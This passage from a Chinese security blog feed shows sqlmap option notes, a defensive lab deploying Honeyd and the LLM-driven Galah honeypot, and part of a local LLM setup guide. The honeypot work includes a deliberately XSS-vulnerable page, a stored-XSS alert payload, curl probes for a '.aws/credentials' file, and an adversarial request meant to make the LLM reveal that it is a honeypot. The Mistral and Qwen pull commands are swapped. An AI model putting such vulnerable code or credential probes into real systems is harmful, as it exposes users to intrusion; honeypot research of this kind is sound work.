href="#测试等级和风险" class="headerlink" title="测试等级和风险"></a>测试等级和风险</h4><p><code>--level=LEVEL</code>：设置测试的等级（1-5，默认为1）lv2：cookie; lv3：user-agent，refere; lv5：host </p><p>在sqlmap/xml/payloads文件内可以看见各个level发送的payload</p><p><code>--risk=RISK</code> ：风险（1-4，默认1）升高风险等级会增加数据被篡改的风险。risk 2：基于事件的测试;risk 3：or语句的测试;risk 4：update的测试</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> Web </tag>
            
            <tag> 软件工具 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>蜜罐配置实验</title>
      <link href="/posts/eae2bdd3ef42/"/>
      <url>/posts/eae2bdd3ef42/</url>
      
        <content type="html"><![CDATA[<h2 id="蜜罐简介"><a href="#蜜罐简介" class="headerlink" title="蜜罐简介"></a>蜜罐简介</h2><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><div class="note info flat"><p><strong>蜜罐</strong>的原理基于一个简单但强大的概念：诱饵。通过创建一个或多个似乎充满漏洞、容易被入侵的目标，安全研究人员和网络防御者吸引攻击者进入一个受控环境，而这个环境旨在记录攻击者的行为、手段、技术和其他关键信息。这些信息随后被用于分析攻击者的行动模式、提高现有安全措施的有效性，以及预防未来的攻击。</p><p>蜜罐的概念可以追溯到1990年代初期，当时互联网安全还处于其发展的早期阶段。最初的蜜罐主要用于研究目的，旨在理解攻击者的行为和攻击模式。随着时间的推移，蜜罐技术得到了发展和完善，其应用范围也从研究扩展到了企业和生产环境中。</p><p>蜜罐的应用场景广泛，不仅可以帮助安全研究人员收集关于恶意软件和黑客技术的情报，还能为企业提供额外的安全层。通过部署蜜罐，企业能够更加主动地发现和应对安全威胁，增强整体的安全防御能力。</p></div><h3 id="Honeyd"><a href="#Honeyd" class="headerlink" title="Honeyd"></a>Honeyd</h3><p><strong>Honeyd</strong>是一款开源的蜜罐软件，由Niels Provos于2003年开发，专门设计用来模拟数千个网络主机上的各种网络服务和操作系统。通过Honeyd，安全研究员和网络管理员可以创建复杂的网络拓扑结构，包括各种虚拟设备（如服务器、路由器、交换机等），以便捕获、分析并理解攻击者的行为和攻击策略。Honeyd的灵活性和可配置性使其成为网络安全领域中一个强大的工具，尤其是在研究和教育环境中。</p><h3 id="Galah"><a href="#Galah" class="headerlink" title="Galah"></a>Galah</h3><p><strong>Galah</strong> 以以模仿而闻名的聪明的澳大利亚鹦鹉命名，在其功能上反映了这一特征。与传统的 Web 蜜罐不同，传统的 Web 蜜罐依赖于手动和限制方法来模拟大量 Web 应用程序或漏洞，Galah 采用了一种新颖的方法。这个由 LLM 提供支持的蜜罐通过动态制作与任意 HTTP 请求相关的（有时是愚蠢的）响应（包括 HTTP 标头和正文内容）来模仿各种 Web 应用程序。</p><h2 id="部署Honeyd"><a href="#部署Honeyd" class="headerlink" title="部署Honeyd"></a>部署Honeyd</h2><h3 id="物理环境"><a href="#物理环境" class="headerlink" title="物理环境"></a>物理环境</h3><p>宿主机（Linux）使用虚拟机，测试机（Win10）使用个人电脑</p><div class="note warning flat"><p>需要注意，Linux的系统最好使用Ubuntu 18.04.6</p><p>最新的版本无法编译honeyd</p></div><p>宿主机和测试机的IP地址设置位于<strong>同一网段</strong></p><p>在宿主机环境中构建蜜罐虚拟机，实验过程中将验证测试机对蜜罐虚拟机的访问</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412130638476.webp" alt="image-20240412130638476"></p><h3 id="依赖项准备"><a href="#依赖项准备" class="headerlink" title="依赖项准备"></a>依赖项准备</h3><p>执行以下指令，安装依赖项</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install g++ gcc</span><br><span class="line">sudo apt-get install flex</span><br><span class="line">sudo apt-get install bison</span><br><span class="line">sudo apt-get install libedit-dev</span><br><span class="line">sudo apt-get install make</span><br></pre></td></tr></table></figure><p>这些依赖库的功能如下：</p><ol><li><strong>g++ </strong>和<strong>gcc</strong>用于编译C和C++程序。对于需要从源代码编译的软件，这两个编译器是基本要求，因为它们能将源代码转换成可执行的二进制程序。</li><li><strong>flex</strong>是一个快速词法分析器生成器。它是UNIX工具lex的一个更加灵活的版本。</li><li><strong>bison</strong>:Bison是一个兼容YACC（Yet Another Compiler Compiler）的解析器生成器，它提供了一种将语法规则转换成C或C++等编程语言的源代码的方法。</li><li><strong>libedit-dev</strong>是一个命令行编辑器库，提供类似于<code>readline</code>的功能。开发者可以使用它来实现命令行的自动补全和历史功能。</li><li><strong>make</strong>是一个非常重要的工具，用于控制编译过程，允许自动化编译和安装程序。</li></ol><h3 id="安装函数库"><a href="#安装函数库" class="headerlink" title="安装函数库"></a>安装函数库</h3><p>准备好和honeyd配套的函数库安装包，我已将其打包上传到了百度云</p><div class="note primary flat"><p>链接：<a href="https://pan.baidu.com/s/1PXMbQK8kMzzj4Q-c5aI-Lw?pwd=jjos">https://pan.baidu.com/s/1PXMbQK8kMzzj4Q-c5aI-Lw?pwd=jjos</a><br>提取码：jjos </p></div><p>安装函数库的步骤如下：</p><ol><li>执行<code>tar -xzvf 安装包名</code>将其解压</li><li>执行<code>cd 安装包目录</code>进入安装包目录</li><li>执行<code>sudo ./configure</code>创建<code>Makefile</code></li><li>执行<code>sudo make</code>命令开始编译过程</li><li>执行<code>sudo make install</code>将编译好的程序和库文件安装到系统的标准位置</li></ol><p>一个示例如下</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408143815604.webp" alt="image-20240408143815604"></p><p>一个推荐安装顺序如下</p><ol><li><p><strong>libdnet-1.11</strong></p></li><li><p><strong>libevent-1.4.14b-stable</strong></p></li><li><strong>libpcap-1.9.0</strong></li><li><strong>zlib-1.2.11</strong></li><li><strong>ARPD</strong></li></ol><p>需要注意的是， <strong>zlib-1.2.11.tar.xz</strong>文件是使用<code>xz</code>压缩算法的<code>tar</code>归档文件，需要使用命令<code>tar -xvf</code></p><p>当安装ARPD库时，直接执行<code>sudo make</code>会出现如下报错</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408150041706.webp" alt="image-20240408150041706"></p><p>需要在 arpd.c 文件中添加如下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> __FUNCTION__ <span class="string">&quot;&quot;</span></span></span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408150332488.webp" alt="image-20240408150332488"></p><h3 id="安装Honeyd"><a href="#安装Honeyd" class="headerlink" title="安装Honeyd"></a>安装Honeyd</h3><p>安装honeyd的步骤与前面安装函数库一致，不过在安装过程中可能会遇到很多问题</p><p>在执行<code>sudo ./configure</code>前，执行<code>sudo ln -s /lib/x86_64-linux-gnu/libc.so.6 /usr/lib/libc.so</code>，成功生成makefile</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408153439690.webp" alt="image-20240408153439690"></p><p>执行<code>sudo make</code>和<code>sudo make install</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408164114077.webp" alt="image-20240408164114077"></p><p>执行<code>sudo ./honeyd -V</code>测试是否安装成功</p><p>出现如下报错</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408164653670.webp" alt="image-20240408164653670"></p><p>执行<code>sudo ln -s /usr/local/lib/libdnet.1 /usr/lib/libdnet.1</code>，重新测试</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408164758766.webp" alt="image-20240408164758766"></p><p>出现版本号，说明安装成功</p><h3 id="配置Honeyd"><a href="#配置Honeyd" class="headerlink" title="配置Honeyd"></a>配置Honeyd</h3><p>在安装Honeyd后，会创建一个<code>/usr/local/share/Honeyd</code>目录</p><p>将该目录下的配置样例文件<code>config.sample</code>拷贝一份放在同目录下，并重命名为<code>honeyd.conf</code>，作为配置文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo cp /usr/local/share/honeyd/config.sample /usr/local/share/honeyd/honeyd.conf</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240408171028570.webp" alt="image-20240408171028570"></p><p>用vim打开该文件，开始配置参数</p><p>我们要参考的模板主要是红框标出来的部分</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240411150306992.webp" alt="image-20240411150306992"></p><p>本次实验配置两个ip，一个模拟Windows系统，另一个模拟linux系统</p><p>修改<code>create</code>后的值，给配置模板起一个名字，windows系统的ip就叫做<code>windows</code></p><p><code>set personality</code>后改为希望蜜罐虚拟出来的系统指纹</p><p><code>set windows default tcp action reset</code>用于关闭所有的TCP端口，仅开放后续服务的端口</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412111547177.webp" alt="image-20240412111547177"></p><p>在windows虚拟蜜罐上分别开启web和ssh服务，并额外开启一个端口用于在扫描时测试</p><p>在linux虚拟蜜罐上开启web、ssh和ftp服务</p><p>分别将它们绑定到<code>192.168.58.161</code>和<code>192.168.58.162</code>，这里需要选择与虚拟机同网段的IP</p><h2 id="测试并分析Honeyd"><a href="#测试并分析Honeyd" class="headerlink" title="测试并分析Honeyd"></a>测试并分析Honeyd</h2><h3 id="运行蜜罐"><a href="#运行蜜罐" class="headerlink" title="运行蜜罐"></a>运行蜜罐</h3><p>执行<code>arpd 192.168.58.161</code>和<code>arpd 192.168.58.162</code>启动Arpd侦听工具，用于应答宿主机的MAC地址</p><p>开启两个终端，分别执行下面两条指令，开启Windows服务器虚拟蜜罐和linux虚拟蜜罐</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">honeyd -d -f /usr/local/share/honeyd/honeyd.conf 192.168.58.161</span><br><span class="line">honeyd -d -f /usr/local/share/honeyd/honeyd.conf 192.168.58.162</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412131147652.webp" alt="image-20240412131147652"></p><h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><p>在测试机上使用SuperScan3.0软件</p><p>IP范围选择网段中的所有IP，端口选择列表中的所有端口，开始扫描</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412131440238.webp" alt="image-20240412131440238"></p><p>点击开始扫描，可以发现该软件会同步进行对IP和端口的扫描</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412131809385.webp" alt="image-20240412131809385"></p><p>最终一共扫描到四台主机，分别是测试机、宿主机和两台蜜罐</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412134247831.webp" alt="image-20240412134247831"></p><p>查看扫描出来的端口，与之前的配置一致</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412134322742.webp" alt="image-20240412134322742"></p><h3 id="测试Web和FTP服务"><a href="#测试Web和FTP服务" class="headerlink" title="测试Web和FTP服务"></a>测试Web和FTP服务</h3><p>找到<code>web.sh</code>脚本</p><p>修改如下默认页面内容，模拟XSS漏洞</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412110049509.webp" alt="image-20240412110049509"></p><p>新的页面内容如下，页面中有一个留言板，提交的内容会被直接作为HTML插入到页面中</p><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">HTTP/1.1 200 OK</span><br><span class="line">Server: Microsoft-IIS/5.0</span><br><span class="line">P3P: CP=<span class="string">&#x27;ALL IND DSP COR ADM CONo CUR CUSo IVAo IVDo PSA PSD TAI TELo OUR SAMo CNT COM INT NAV ONL PHY PRE PUR UNI&#x27;</span></span><br><span class="line">Content-Location: http://cpmsftwbw27/default.htm</span><br><span class="line">Date: Thu, 04 Apr 2002 06:42:18 GMT</span><br><span class="line">Content-Type: text/html</span><br><span class="line">Accept-Ranges: bytes</span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html lang=<span class="string">&quot;zh&quot;</span>&gt;</span><br><span class="line">&lt;<span class="built_in">head</span>&gt;</span><br><span class="line">    &lt;meta charset=<span class="string">&quot;UTF-8&quot;</span>&gt;</span><br><span class="line">    &lt;title&gt;简单留言板&lt;/title&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;h1&gt;留言板&lt;/h1&gt;</span><br><span class="line">    &lt;form method=<span class="string">&quot;POST&quot;</span> action=<span class="string">&quot;&quot;</span>&gt;</span><br><span class="line">        &lt;label <span class="keyword">for</span>=<span class="string">&quot;message&quot;</span>&gt;留言:&lt;/label&gt;</span><br><span class="line">        &lt;input <span class="built_in">type</span>=<span class="string">&quot;text&quot;</span> <span class="built_in">id</span>=<span class="string">&quot;message&quot;</span> name=<span class="string">&quot;message&quot;</span>&gt;</span><br><span class="line">        &lt;button <span class="built_in">type</span>=<span class="string">&quot;submit&quot;</span>&gt;提交&lt;/button&gt;</span><br><span class="line">    &lt;/form&gt;</span><br><span class="line">    &lt;h2&gt;留言列表：&lt;/h2&gt;</span><br><span class="line">    &lt;ul <span class="built_in">id</span>=<span class="string">&quot;messages&quot;</span>&gt;</span><br><span class="line">        &lt;!-- 服务器端渲染的留言将显示在这里 --&gt;</span><br><span class="line">    &lt;/ul&gt;</span><br><span class="line"></span><br><span class="line">    &lt;script&gt;</span><br><span class="line">        // 简化的客户端JavaScript代码，用于处理表单提交和显示留言</span><br><span class="line">        document.querySelector(<span class="string">&#x27;form&#x27;</span>).onsubmit = <span class="keyword">function</span>(event) &#123;</span><br><span class="line">            event.preventDefault();</span><br><span class="line">            const message = document.getElementById(<span class="string">&#x27;message&#x27;</span>).value;</span><br><span class="line">            const li = document.createElement(<span class="string">&#x27;li&#x27;</span>);</span><br><span class="line">            // 这里直接将输入内容作为 HTML 插入到页面中</span><br><span class="line">            li.innerHTML = message;</span><br><span class="line">            document.getElementById(<span class="string">&#x27;messages&#x27;</span>).appendChild(li);</span><br><span class="line">            document.getElementById(<span class="string">&#x27;message&#x27;</span>).value = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">        &#125;;</span><br><span class="line">    &lt;/script&gt;</span><br><span class="line">&lt;/body&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure><p>修改完脚本文件后，重新启动蜜罐</p><p>在测试机的浏览器中访问<code>192.168.58.161</code>或者<code>192.168.58.162</code></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412151546500.webp" alt="image-20240412151546500"></p><p>尝试存储型XSS攻击，在留言板输入框中提交如下代码</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;javascript:alert(&#x27;Hacked by R1ck&#x27;)&quot;</span>&gt;</span>hack<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412151636083.webp" alt="image-20240412151636083"></p><p>留言板中出现刚刚注入的链接，点击链接后出现弹窗，说明XSS攻击成功</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412151712208.webp" alt="image-20240412151712208"></p><p>再来尝试一下FTP服务</p><p>使用FileZilla软件连接到<code>192.168.58.162</code>，此时在攻击者的视角是不知道用户名和密码的，这需要进一步的去爆破，所以模拟时用户名和密码留空，点击快速连接</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412161442792.webp" alt="image-20240412161442792"></p><p>这种模拟的FTP服务器可以吸引黑客去爆破用户名和密码，或者进行其他的漏洞攻击</p><h3 id="分析日志"><a href="#分析日志" class="headerlink" title="分析日志"></a>分析日志</h3><p>在<code>tmp</code>目录下找到虚拟web服务的日志文件</p><p>该日志记录了虚拟web服务接收到的一些请求</p><p>从中可以分析出攻击者的一些特征，例如他的主机类型、浏览器信息以及请求内容</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412161916399.webp" alt="image-20240412161916399"></p><p>找到FTP的日志文件</p><p>日志文件中记录了攻击者与虚拟FTP服务器的交互时间以及交互的指令</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412162242860.webp" alt="image-20240412162242860"></p><h2 id="部署Galah"><a href="#部署Galah" class="headerlink" title="部署Galah"></a>部署Galah</h2><p>galah基于go语言开发，需要在本地设备上安装并配置好Go v1.20+环境，这里就省略了</p><p>首先把galah项目克隆到本地</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/0x4D31/galah.git</span><br></pre></td></tr></table></figure><p>在项目文件夹下打开终端</p><p>执行<code>go mod download</code>下载依赖包</p><p>执行<code>go build</code>来生成可执行文件</p><p>执行<code>galah -h</code>来查看galah的用法，同时验证是否安装成功</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240411164055589.webp" alt="image-20240411164055589"></p><p>找到Galah的配置文件<code>config</code>，填入自己的Openai APIKey，并选择模型</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240411211141540.webp" alt="image-20240411211141540"></p><h2 id="测试并分析Galah"><a href="#测试并分析Galah" class="headerlink" title="测试并分析Galah"></a>测试并分析Galah</h2><h3 id="运行蜜罐-1"><a href="#运行蜜罐-1" class="headerlink" title="运行蜜罐"></a>运行蜜罐</h3><p>执行<code>galah -v -i env0 -o request.log</code>开启蜜罐，将请求日志保存在<code>request.log</code>日志文件中</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412160127067.webp" alt="image-20240412160127067"></p><p>使用curl命令传http请求来测试该蜜罐</p><h3 id="信息收集-1"><a href="#信息收集-1" class="headerlink" title="信息收集"></a>信息收集</h3><p>首先模拟信息收集时黑客可能进行的操作，比如扫描网站的目录</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X POST http://localhost:8080/login.php</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412165215928.webp" alt="image-20240412165215928"></p><p>蜜罐根据请求的页面的名称，返回了一共简陋的html登录页面</p><p>接下来模拟黑客扫描漏洞的过程，尝试访问存放于服务器上的 AWS（亚马逊网络服务）凭证文件</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080/.aws/credentials</span><br></pre></td></tr></table></figure><p>此时蜜罐返回404页面，说明它会有选择的响应带漏洞的页面</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412165857206.webp" alt="image-20240412165857206"></p><p>再模拟访问网站的<code>robot.txt</code>，即网站的搜索引擎爬虫规则，通常黑客可以通过该文件获取网站的目录信息</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8080/robots.txt</span><br></pre></td></tr></table></figure><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412165921883.webp" alt="image-20240412165921883"></p><p>该蜜罐也像模像样地返回了一个robots文件，同时其中并未透露目录信息</p><h3 id="测试鲁棒性"><a href="#测试鲁棒性" class="headerlink" title="测试鲁棒性"></a>测试鲁棒性</h3><p>尝试在请求体或URL中输入一些奇怪的内容，使得该蜜罐返回一些异常或错误的响应，以测试其鲁棒性和应对未知请求的能力。</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl -X GET http://localhost:8080/somethingweird</span><br></pre></td></tr></table></figure><p>发送上面这条请求，观察蜜罐对完全不符合预期的路由请求是如何反应</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412170506827.webp" alt="image-20240412170506827"></p><p>可以发现蜜罐返回了404页面，说明它不会为一些奇怪的路由请求生成响应页面</p><p>尝试使用对抗性提示词</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">curl http://localhost:8888/are-you-a-honeypot</span><br></pre></td></tr></table></figure><p>如果该蜜罐的大模型不够成熟，可能会对该提示词作出反应</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412171502993.webp" alt="image-20240412171502993"></p><p>可以发现仍然返回的是404 Not Found</p><h3 id="分析日志-1"><a href="#分析日志-1" class="headerlink" title="分析日志"></a>分析日志</h3><p>检查<code>request.log</code>日志文件</p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412171827646.webp" alt="image-20240412171827646"></p><p><img src="https://r1ck-blog.oss-cn-shenzhen.aliyuncs.com/image-20240412171823433.webp" alt="image-20240412171823433"></p><p>日志文件中记录了每一条发给蜜罐的请求信息和相应的响应信息</p><h2 id="总结和收获"><a href="#总结和收获" class="headerlink" title="总结和收获"></a>总结和收获</h2><p>本次实验中，一共尝试部署了两种蜜罐，分别是honeyd和galah。通过对这两种蜜罐的实践和测试，对于蜜罐的原理和工作流程有了一定的初步了解。</p><p>当然，通过对低交互型的honeyd和高交互型的galah的效果分析和对比，可以得出一些结论：</p><p>低交互型的蜜罐如honeyd操作简便，资源消耗较少。它们通过模拟网络服务的基本响应来吸引黑客，适合于捕捉大规模扫描和初级攻击尝试。但低交互蜜罐的缺点在于其交互的有限性，很难提供深入的攻击行为分析，也较容易被有经验的攻击者识别出来。同时低交互蜜罐需要大量的先验知识，对于未知漏洞或协议缺陷等实施的未知攻击，将会存在大量的漏报、误报，蜜罐的作用将大打折扣。</p><p>高交互型的蜜罐更容易欺骗和吸引黑客来攻击，因为它们提供更真实的服务和系统环境，使得攻击者更难辨识出这是一个蜜罐。本次实验中的galah是web蜜罐，当然还存在类似终端shell的高交互蜜罐。这些高交互蜜罐能模拟复杂的系统行为和用户交互，包括详细的系统命令响应、应用程序逻辑，甚至可以与攻击者进行多步交互，从而有效地记录攻击者的行为和策略。</p><p>然而，高交互蜜罐也有其缺点。它们通常需要更多的资源来维持，包括更复杂的配置和更高的运维成本。此外，高交互蜜罐由于其复杂性，一旦被黑客识破，也可能被利用来攻击其他系统。因此，部署高交互蜜罐时需要更为严格的安全措施和恰当的隔离策略。</p><p>这就引入了大语言模型与蜜罐相结合的理念，我们可以利用大语言模型来增强蜜罐的功能，提高其自动化和智能化水平，而且在高交互蜜罐中的应用潜力非常大。像本次实验使用的高交互蜜罐Galah就还有很多优化空间，比如添加支持使用本地大语言模型，又或者是将web虚拟蜜罐和终端虚拟蜜罐结合在一起，让攻击者在攻击的全流程都深陷蜜罐中，误以为自己成功打掉一台主机还提权成功。</p><p>总的来说，大语言模型为蜜罐技术提供了一条强大的发展道路。通过合理配置和持续优化，结合大语言模型的蜜罐能够提供更有效的网络安全防护。随着技术的进步和成本的降低，未来这种蜜罐有希望在更广泛的应用场景中扮演关键角色。</p>]]></content>
      
      
      
        <tags>
            
            <tag> note </tag>
            
            <tag> Web </tag>
            
            <tag> Web安全 </tag>
            
            <tag> 渗透 </tag>
            
            <tag> 蓝队 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>大语言模型本地部署记录</title>
      <link href="/posts/c9a7f16894ae/"/>
      <url>/posts/c9a7f16894ae/</url>
      
        <content type="html"><![CDATA[<p>最近突然对大语言模型感兴趣</p><p>同时在平时的一些线下断网的CTF比赛中，大语言模型也可以作为一个能对话交互的高级知识检索库</p><p>本篇文章旨在记录我在本地部署大语言模型的过程</p><h2 id="安装Ollama"><a href="#安装Ollama" class="headerlink" title="安装Ollama"></a>安装Ollama</h2><div class="note info flat"><p><strong>Ollama</strong>是一个轻量级、可扩展的框架，旨在帮助用户在本地机器上构建、运行和分享大语言模型。</p></div><p>前往Ollama的官网<a href="https://ollama.com/">Ollama</a>下载最新版本的安装包</p><div class="note warning flat"><p>需要注意的是，该软件默认安装在C盘下，所以如果有精神洁癖的小伙伴也可以使用docker部署Ollama</p></div><p>在终端中输入<code>ollama --version</code></p><img src="/posts/c9a7f16894ae/image-20240404011615255.png" class="" title="image-20240404011615255"><p>返回版本信息，说明安装成功</p><h2 id="更改模型存放位置"><a href="#更改模型存放位置" class="headerlink" title="更改模型存放位置"></a>更改模型存放位置</h2><p>前往系统环境变量设置，添加如下<strong>系统变量</strong></p><img src="/posts/c9a7f16894ae/image-20240404131629060.png" class="" title="image-20240404131629060"><p>重启Ollama</p><h2 id="拉取模型"><a href="#拉取模型" class="headerlink" title="拉取模型"></a>拉取模型</h2><h3 id="Gemma"><a href="#Gemma" class="headerlink" title="Gemma"></a>Gemma</h3><p>目前在Ollama上，Gemma模型已经拥有超过430K的拉取次数。基本上Gemma可以算是Ollama最热门的模型了</p><p>Gemma提供了不同参数规模的版本，2b（20亿参数）和7b（70亿参数）。<strong>参数的数量直接影响了模型对语言的理解能力</strong>，更多的参数通常意味着更好的理解、生成和预测能力，但同时也需要更强大的计算资源和更长的处理时间</p><p>每个参数版分为轻量版和全量版，2b模型即便是在没有独显的笔记本电脑上都能尝试运行，而规模更大的7b、7b全量版分别需要8GB和16GB显存。</p><p>因为本人的笔记本显卡是RTX 3070Laptop，为了防止显卡撑爆，选择部署<strong>2b全量版</strong></p><p>首先确保Ollama框架有在运行，在终端中输入<code>ollama pull gemma:2b-instruct-fp16</code>拉取模型</p><p>gemma后跟的是参数版本</p><p>拉取模型的过程中尽量开代理，因为Ollama的数据库在海外</p><img src="/posts/c9a7f16894ae/image-20240404134718512.png" class="" title="image-20240404134718512"><p>提示<code>success</code>说明拉取成功</p><h3 id="Mistral"><a href="#Mistral" class="headerlink" title="Mistral"></a>Mistral</h3><p><strong>Mistral 7B</strong> 是一款拥有<strong>70亿参数</strong>的精心设计的语言模型，旨在实现卓越性能和高效运行。它在各类基准测试中表现出色，超越了当前最佳的开源13B模型——<strong>Llama 2</strong>，并在推理能力、数学计算精准度以及代码生成任务上均超越了已公开的34B模型——<strong>Llama 1</strong></p><p>执行<code>ollama pull qwen:7b</code>拉取模型</p><h3 id="Qwen1-5-通义千问"><a href="#Qwen1-5-通义千问" class="headerlink" title="Qwen1.5(通义千问)"></a>Qwen1.5(通义千问)</h3><p>考虑到本地部署时对硬件的要求，我们不得不选取参数量较小的模型</p><p>通常的游戏笔记本的显卡内存在4G到8G之间，对应的模型参数量范围在20亿到70亿间</p><p>而今年年初阿里巴巴开源的Qwen1.5恰好有一个70亿参数量的版本，显存占用在7G左右，非常适合在中高端游戏本上部署</p><p>执行<code>ollama pull mistral:latest</code>拉取模型</p><h3 id="codellama"><a href="#codellama" class="headerlink" title="codellama"></a>codellama</h3><p>code llama在llama2模型的基础上，利用代码数据进行训练和微调，提高了llama2在代码生成上的能力</p><p>code llama提供了三种模型，每种模型包含7B,13B,34B三个尺寸，支持多种编程语言，如Python, C++, Java, PHP, Typescript (Javascript), C#, Bash等。</p><ul><li>Code Llama，代码生成的基础模型；</li><li>Code Llama-Python，单独针对于python的模型；</li><li>Code Llama-Instruct，根据人工指令微调的模型。</li></ul><p>这里我们选用基础模型，执行<code>ollama pull codellama:7b</code>拉取模型</p><h2 id="部署Open-webui"><a href="#部署Open-webui" class="headerlink" title="部署Open webui"></a>部署Open webui</h2><p>Open WebUI是目前GitHub上开源的类Chatgpt前端界面中，star数量最多的框架之一</p><p>而更重要的是Open WebUI的前身即Ollama WebUI，所以它对于Ollama的支持非常好</p><p>执行下面的指令来拉取并部署Open WebUI的docker容器</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker run -d -p 3000:8080 --add-host=host.docker.internal:host-gateway -v open-webui:/app/backend/data --name open-webui --restart always ghcr.io/open-webui/open-webui:main</span><br></pre></td></tr></table></figure><p>在浏览器上访问<a href="https://localhost:3000">https://localhost:3000</a></p><img src="/posts/c9a7f16894ae/image-20240407160513744.png" class="" title="image-20240407160513744"><p>点击加号添加刚刚拉取的所有模型，方便后续同时测试多个模型</p><img src="/posts/c9a7f16894ae/image-20240407162644268.png" class="" title="image-20240407162644268"><h2 id="测试性能"><a href="#测试性能" class="headerlink" 